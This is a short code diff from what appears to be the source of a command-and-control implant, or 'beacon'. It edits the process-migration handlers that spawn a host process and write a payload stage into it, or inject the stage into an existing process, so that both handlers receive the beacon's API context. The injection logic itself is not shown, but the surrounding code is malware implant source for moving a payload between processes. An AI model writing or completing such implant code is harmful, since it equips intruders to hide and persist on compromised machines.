@@ -176,7 +176,7 @@ static ByteBuf MigrateHandleSetSpawnTo(Parser* parser)
 }
 
 /* 处理 spawn 型 migrate，请求后端创建宿主进程并写入 stage。 */
-static ByteBuf MigrateHandleSpawn(Parser* parser)
+static ByteBuf MigrateHandleSpawn(BeaconContext* ctx, Parser* parser)
 {
     MigrateRequest req;
     DWORD pid = 0;
@@ -186,6 +186,7 @@ static ByteBuf MigrateHandleSpawn(Parser* parser)
 
     ZeroMemory(&req, sizeof(req));
     req.subcmd = MIGRATE_SUBCMD_SPAWN_STAGE;
+    req.api = &ctx->api;
     BbInit(&req.stage);
     ZeroMemory(status, sizeof(status));
     ZeroMemory(err, sizeof(err));
@@ -235,7 +236,7 @@ static ByteBuf MigrateHandleSpawn(Parser* parser)
 }
 
 /* 处理 inject 型 migrate，请求后端把 stage 注入已有进程。 */
-static ByteBuf MigrateHandleInject(Parser* parser)
+static ByteBuf MigrateHandleInject(BeaconContext* ctx, Parser* parser)
 {
     MigrateRequest req;
     CHAR status[160];
@@ -244,6 +245,7 @@ static ByteBuf MigrateHandleInject(Parser* parser)
 
     ZeroMemory(&req, sizeof(req));
     req.subcmd = MIGRATE_SUBCMD_INJECT_STAGE;
+    req.api = &ctx->api;
     BbInit(&req.stage);
     ZeroMemory(status, sizeof(status));
     ZeroMemory(err, sizeof(err));
@@ -299,7 +301,6 @@ ByteBuf MigrateHandle(BeaconContext* ctx, UINT32 task_id, Parser* parser)
 {
     UINT32 subcmd;
 
-    (VOID)ctx;
     (VOID)task_id;
 
     if (!parser) {
@@ -315,9 +316,9 @@ ByteBuf MigrateHandle(BeaconContext* ctx, UINT32 task_id, Parser* parser)
     case MIGRATE_SUBCMD_SET_SPAWNTO:
         return MigrateHandleSetSpawnTo(parser);
     case MIGRATE_SUBCMD_SPAWN_STAGE:
-        return MigrateHandleSpawn(parser);
+        return MigrateHandleSpawn(ctx, parser);
     case MIGRATE_SUBCMD_INJECT_STAGE:
-        return MigrateHandleInject(parser);
+        return MigrateHandleInject(ctx, parser);
     default:
         break;
     }
